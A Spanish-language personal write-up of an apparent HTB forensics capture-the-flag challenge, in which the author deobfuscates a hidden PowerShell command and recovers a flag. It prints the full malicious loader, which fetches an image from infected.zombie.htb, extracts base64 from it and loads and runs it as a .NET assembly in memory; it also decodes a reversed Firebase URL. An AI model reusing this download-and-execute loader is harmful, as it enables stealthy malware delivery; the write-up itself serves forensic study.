  Este writeup era personal pero lo comparto por si te quedas estancado, no hay explicación acerca de lo que hago...

---
# Enunciado del problema

Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future. *Note:** Make sure you edit `/etc/host` so that any hostnames found point to the Docker IP.

---
# Resolución

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240510183728.png)

tomqOXAFzrtBfQNTWGTuDgkLdYgzpoJtKGfuDsVESyJFHtcTuIutPkyuVQpwGLbFvLzIXmwguYvYDQgGkwihbveHvvcwfRqtjiREeQFyWwImwPIYWQUCUkxpKztLmHwNlIJgvNGzLQmRPuWNmhjWkXYLnDNfNpXwZwmVMhIMMViCmFVUKhHgGZowKY

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504222007.png)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504225919.png)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504225930.png)

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504225949.png)


```plaintext
powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD

'$Codigo = '';$OWjuxd = [symstem.Text.encoding]::Undoce.GetString
```


Fisrt part after -> `'$Codigo = '';$OWjuxd = [system.Text.encoding]::Unicode.GetString(`
```powershell
[.]
```

After `::`

```powershell
::($.
```

Empezando los `('', ,'')`

```powershell
("","")))
```

Por ultimo

```powershell
powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD'
```

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504231753.png)

```powershell
$codigo = "";

$OWjuxd = [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64string($codigo.replace("em9tYmllc","A")));

Write-Output $OWjuxD
```

```powershell
$imageUrl = 'http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg';
$webClient = New-Object System.Net.WebClient;$imageBytes = $webClient.DownloadData($imageUrl);
$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
$startFlag = '<<BASE64_START>>';
$endFlag = '<<BASE64_END>>';
$startIndex = $imageText.IndexOf($startFlag);
$endIndex = $imageText.IndexOf($endFlag);
$startIndex -ge 0 -and $endIndex -gt $startIndex;
$startIndex += $startFlag.Length;
$base64Length = $endIndex - $startIndex;
$base64Command = $imageText.Substring($startIndex, $base64Length);$commandBytes = [System.Convert]::FromBase64String($base64Command);
$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);
$type = $loadedAssembly.GetType('Fiber.Home');
$method = $type.GetMethod('VAI').Invoke($null, [object[]] ('ZDVkZmYyMWIxN2VlLTFmNDgtNWM3NC1jOTM0LWQ3M2MyYTYzPW5la290JmFpZGVtPXRsYT90eHQucmVmc25hcnQvby9tb2MudG9wc3BwYS5mOTNjNi1nbmlrY2FoL2IvMHYvbW9jLnNpcGFlbGdvb2cuZWdhcm90c2VzYWJlcmlmLy86c3B0dGg=' , 'dfdfd' , 'dfdf' , 'dfdf' , 'dadsa' , 'de' , 'cu'))
```

```powershell
$> echo "d5dff21b17ee-1f48-5c74-c934-d73c2a63=nekot&aidem=tla?txt.refsnart/o/moc.topsppa.f93c6-gnikcah/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth" | rev

https://firebasestorage.googleapis.com/v0/b/hacking-6c39f.appspot.com/o/transfer.txt?alt=media&token=36a2c37d-439c-47c5-84f1-ee71b12ffd5d
```

No se como decirlo, sufrimiento dolor, angustia pero felicidad porque encontre un ddl dentro de la imagen:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240504233806.png)

Con zsteg o mostrando la variable `$base64Command`.

```bash
$> strings download.exe -n10 | grep HTB 

HTB{gas-GAS_gasg-asga_SgA_SGa}
```

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240505000147.png)
